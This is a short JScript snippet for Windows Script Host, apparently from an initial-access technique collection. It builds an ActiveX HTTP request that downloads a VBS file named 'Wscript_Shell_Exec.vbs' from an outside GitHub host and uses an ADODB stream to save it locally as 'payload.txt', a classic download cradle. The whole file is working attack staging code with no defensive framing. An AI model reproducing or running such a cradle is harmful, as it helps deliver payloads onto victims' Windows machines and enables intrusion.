// "WinHttp.WinHttpRequest.5.1"
// "WinHttp.WinHttpRequest"
// "MSXML2.ServerXMLHTTP"
// "Microsoft.XMLHTTP"
// "MSXML2.XMLHTTP.6.0"

var xHttp = new ActiveXObject("MSXML2.XMLHTTP.6.0")
xHttp.Open("GET", "https://raw.githubusercontent.com/hegusung/Windows-Initial-Access/main/VBS/Wscript_Shell_Exec.vbs", false)
xHttp.Send()

var bStrm = new ActiveXObject("Adodb.Stream")
bStrm.type = 1
bStrm.Open()
bStrm.write(xHttp.responseBody)
bStrm.savetofile(".\\payload.txt", 2)
